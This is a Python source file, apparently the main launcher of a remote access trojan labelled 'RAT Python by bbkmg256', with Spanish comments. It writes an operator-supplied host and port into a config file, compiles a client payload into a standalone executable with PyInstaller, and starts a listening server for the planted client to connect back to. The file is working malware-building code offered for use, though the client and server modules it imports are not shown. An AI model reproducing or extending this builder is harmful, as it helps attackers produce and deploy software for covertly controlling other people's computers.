# Main RAT

from data import server
import sys
import subprocess as sp
# import os
import time
import configparser
import PyInstaller.__main__ as pycomp


class Main():
	def __init__(self, host, puerto):
		self._HOST = host
		self._PUERTO = puerto
		self._config = configparser.ConfigParser()
		self._rut_conf = './data/conf/socket.ini'
	

	# Para compilar el cliente
	def compilar_cli(self):
		# Creacion / Modificacion de fichero de configuracion
		self._config['SOCKET'] = {
			'host_ip' : self._HOST,
			'puerto' : self._PUERTO
		}
		with open(self._rut_conf, 'w') as fichero_conf:
			self._config.write(fichero_conf)

		# Compilacion
		try:
			print(" [!] Preparando el cliente..."); time.sleep(2)
			pycomp.run(['--onefile', '--add-data', './data/conf/socket.ini:./conf', './data/cliente.py'])
			# sp.run(['pyinstaller', '--onefile', '--add-data', './data/conf/socket.ini:./conf', './data/cliente.py'])
			print("\n [!] Cliente preparado con exito!")
		except:
			print(" [!] Algo falló y no se pudo compilar el cliente!\n")
			sys.exit()


	# Para levantar el servidor
	def ejecutar_servidor(self):
		self._serv = server.Servidor(self._HOST, self._PUERTO)
		self._serv.levantar_servidor()


# Ejecucion principal
if __name__ == '__main__':
	ver = '(v0.0.5)'
	banner = f'''

	████████╗ ██████╗ ██████╗  ██████╗        ██████╗ ██╗ ██████╗ ██╗ ██████╗ ██╗
	╚══██╔══╝██╔═══██╗██╔══██╗██╔═══██╗      ██╔════╝ ██║██╔════╝ ██║██╔═══██╗██║
	   ██║   ██║   ██║██████╔╝██║   ██║█████╗██║  ███╗██║██║  ███╗██║██║   ██║██║
	   ██║   ██║   ██║██╔═══╝ ██║   ██║╚════╝██║   ██║██║██║   ██║██║██║   ██║╚═╝
	   ██║   ╚██████╔╝██║     ╚██████╔╝      ╚██████╔╝██║╚██████╔╝██║╚██████╔╝██╗
	   ╚═╝    ╚═════╝ ╚═╝      ╚═════╝        ╚═════╝ ╚═╝ ╚═════╝ ╚═╝ ╚═════╝ ╚═╝
   
			[!] RAT Python by bbkmg256 {ver} [!]
	'''

	try:
		print(f"{banner}\n"); time.sleep(2)
		
		main = Main(sys.argv[1], sys.argv[2])
	
		main.compilar_cli()
		main.ejecutar_servidor()
	
	except KeyboardInterrupt:
		print("\n [!] Ejecución abortada!\n")
	
	except:
		print("\n [!] Algo falló al iniciar!\n")
